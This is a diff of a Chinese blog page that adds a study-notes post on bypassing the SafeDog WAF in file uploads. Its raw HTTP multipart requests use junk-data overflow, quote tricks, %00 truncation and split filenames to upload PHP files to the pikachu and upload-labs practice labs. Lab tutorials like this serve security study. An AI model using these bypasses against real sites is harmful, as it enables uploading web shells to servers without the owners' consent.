@@ -443,12 +443,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -466,14 +479,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -493,7 +506,218 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-文件上传之WAF绕过及安全修复"><a href="#WEB漏洞-文件上传之WAF绕过及安全修复" class="headerlink" title="WEB漏洞-文件上传之WAF绕过及安全修复"></a><font size="6"><strong>WEB漏洞-文件上传之WAF绕过及安全修复</strong></font></h2><span id="more"></span>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/1.png"></p>
+<h3 id="一、上传参数名解析"><a href="#一、上传参数名解析" class="headerlink" title="一、上传参数名解析"></a><font size="5"><strong>一、上传参数名解析</strong></font></h3><pre class=" language-bash"><code class="language-bash">明确有哪些东西能修改:
+
+Content-Disposition:	一般可更改
+
+name:	表单参数值，不能更改
+
+filename :文件名，可以更改
+
+Content-Type:文件MIME，视情况更改
+</code></pre>
+<h3 id="二、常见的绕过方法"><a href="#二、常见的绕过方法" class="headerlink" title="二、常见的绕过方法"></a><font size="5"><strong>二、常见的绕过方法</strong></font></h3><pre class=" language-bash"><code class="language-bash">数据溢出-防匹配<span class="token punctuation">(</span>xxx<span class="token punctuation">..</span> .<span class="token punctuation">)</span>
+
+符号变异-防匹配（'" <span class="token punctuation">;</span><span class="token punctuation">)</span>
+
+数据截断-防匹配<span class="token punctuation">(</span>%00 <span class="token punctuation">;</span>换行<span class="token punctuation">)</span>
+
+重复数据-防匹配<span class="token punctuation">(</span>参数多次<span class="token punctuation">)</span>
+</code></pre>
+<h3 id="三、pikachu-安全狗绕过"><a href="#三、pikachu-安全狗绕过" class="headerlink" title="三、pikachu+安全狗绕过"></a><font size="5"><strong>三、pikachu+安全狗绕过</strong></font></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shley/p/14800623.html">https://www.cnblogs.com/shley/p/14800623.html</a></p>
+<h4 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a><font size="4"><strong>数据溢出</strong></font></h4><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/2.png"></p>
+<p>正常上传的情况<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/3.png"></p>
+<p>被安全狗拦截的情况<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/4.png"></p>
+<p>修改数据包上传Content-Disposition: form-data; name&#x3D;”uploadfile”;中间插入大量的垃圾数据从而绕过。<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/5.png"></p>
+<p>%00截断</p>
+<p>使用%00截断，添加合法后缀名<br>格式：文件名.php%00.png<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/6.png"></p>
+<h4 id="改变符号"><a href="#改变符号" class="headerlink" title="改变符号"></a><font size="4"><strong>改变符号</strong></font></h4><p>去掉双引号</p>
+<pre class=" language-bash"><code class="language-bash">POST /vul/unsafeupload/servercheck.php HTTP/1.1
+Host: 10.1.1.6:88
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------276594773132894662704244861418
+Content-Length: 367
+Origin: http://10.1.1.6:88
+Connection: close
+Referer: http://10.1.1.6:88/vul/unsafeupload/servercheck.php
+Cookie: PHPSESSID<span class="token operator">=</span>e405r8e634hhjk7su64ofmjknl
+Upgrade-Insecure-Requests: 1
+
+-----------------------------276594773132894662704244861418
+Content-Disposition: form-data<span class="token punctuation">;</span>name<span class="token operator">=</span><span class="token string">"uploadfile"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span>info4.php
+Content-Type: image/jpeg
+
+<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+-----------------------------276594773132894662704244861418
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>
+
+å¼å§ä¸ä¼ 
+-----------------------------276594773132894662704244861418--
+</code></pre>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/7.png"></p>
+<p>只使用一个双引号，成功上传文件info5.php</p>
+<pre class=" language-bash"><code class="language-bash">POST /vul/unsafeupload/servercheck.php HTTP/1.1
+Host: 10.1.1.6:88
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------276594773132894662704244861418
+Content-Length: 368
+Origin: http://10.1.1.6:88
+Connection: close
+Referer: http://10.1.1.6:88/vul/unsafeupload/servercheck.php
+Cookie: PHPSESSID<span class="token operator">=</span>e405r8e634hhjk7su64ofmjknl
+Upgrade-Insecure-Requests: 1
+
+-----------------------------276594773132894662704244861418
+Content-Disposition: form-data<span class="token punctuation">;</span>name<span class="token operator">=</span><span class="token string">"uploadfile"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info5.php
+Content-Type: image/jpeg
+
+&lt;?php phpinfo(); ?>
+-----------------------------276594773132894662704244861418
+Content-Disposition: form-data; name="</span>submit"
+
+å¼å§ä¸ä¼ 
+-----------------------------276594773132894662704244861418--
+</code></pre>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/8.png"></p>
+<h3 id="四、uploads-安全狗绕过"><a href="#四、uploads-安全狗绕过" class="headerlink" title="四、uploads+安全狗绕过"></a><font size="5"><strong>四、uploads+安全狗绕过</strong></font></h3><h4 id="数据溢出-1"><a href="#数据溢出-1" class="headerlink" title="数据溢出"></a><font size="4"><strong>数据溢出</strong></font></h4><pre class=" language-bash"><code class="language-bash">POST /Pass-06/index.php?action<span class="token operator">=</span>show_code HTTP/1.1
+Host: 10.1.1.6
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------219208409912899756444268510117
+Content-Length: 378
+Origin: http://10.1.1.6
+Connection: close
+Referer: http://10.1.1.6/Pass-06/index.php?action<span class="token operator">=</span>show_code
+Upgrade-Insecure-Requests: 1
+
+-----------------------------219208409912899756444268510117
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span>填充大量的垃圾数据<span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info.Php"</span>
+Content-Type: application/octet-stream
+
+<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+-----------------------------219208409912899756444268510117
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>
+
+涓婁紶
+-----------------------------219208409912899756444268510117--
+</code></pre>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/9.png"></p>
+<h4 id="改变符号-1"><a href="#改变符号-1" class="headerlink" title="改变符号"></a><font size="4"><strong>改变符号</strong></font></h4><pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1
+Host: 10.1.1.6
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348
+Content-Length: 363
+Origin: http://10.1.1.6
+Connection: close
+Referer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_code
+Upgrade-Insecure-Requests: 1
+
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info.php
+Content-Type: image/jpeg
+
+&lt;?php phpinfo(); ?>
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data; name="</span>submit"
+
+涓婁紶
+-----------------------------156187617541967037312717027348--
+</code></pre>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/10.png"></p>
+<pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1
+Host: 10.1.1.6
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348
+Content-Length: 362
+Origin: http://10.1.1.6
+Connection: close
+Referer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_code
+Upgrade-Insecure-Requests: 1
+
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span>info.php
+Content-Type: image/jpeg
+
+<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>
+
+涓婁紶
+-----------------------------156187617541967037312717027348--
+</code></pre>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/11.png"></p>
+<p>%00截断</p>
+<pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1
+Host: 10.1.1.6
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348
+Content-Length: 371
+Origin: http://10.1.1.6
+Connection: close
+Referer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_code
+Upgrade-Insecure-Requests: 1
+
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info.php%00.png"</span>
+Content-Type: image/jpeg
+
+<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>
+
+涓婁紶
+-----------------------------156187617541967037312717027348--
+</code></pre>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/12.png"></p>
+<h4 id="换行执行"><a href="#换行执行" class="headerlink" title="换行执行"></a><font size="4"><strong>换行执行</strong></font></h4><pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1
+Host: 10.1.1.6
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348
+Content-Length: 368
+Origin: http://10.1.1.6
+Connection: close
+Referer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_code
+Upgrade-Insecure-Requests: 1
+
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"x.
+p
+h
+p"</span>
+Content-Type:  image/jpeg
+
+<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+-----------------------------156187617541967037312717027348
+Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>
+
+涓婁紶
+-----------------------------156187617541967037312717027348--
+</code></pre>
+<p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/13.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/14.png"></p>
+<h3 id="五、fuzz字典"><a href="#五、fuzz字典" class="headerlink" title="五、fuzz字典"></a><font size="5"><strong>五、fuzz字典</strong></font></h3><p><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br><a target="_blank" rel="noopener" href="https://github.com/TuuuNya/fuzz_dict">https://github.com/TuuuNya/fuzz_dict</a><br><a target="_blank" rel="noopener" href="https://github.com/jas502n/fuzz-wooyun-org">https://github.com/jas502n/fuzz-wooyun-org</a><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/15.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/16.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/17.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/18.png"></p>
+
                 
             </div>
             <hr/>
@@ -556,7 +780,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -740,7 +968,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-XSS跨站之原理分类及攻击手法
                         
                     </div>
                     <div class="publish-info">
@@ -749,11 +977,23 @@
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            爱睡懒觉的道士
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1040,7 +1280,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.9k</span>&nbsp;字
+                class="white-color">43.6k</span>&nbsp;字
             
             
             
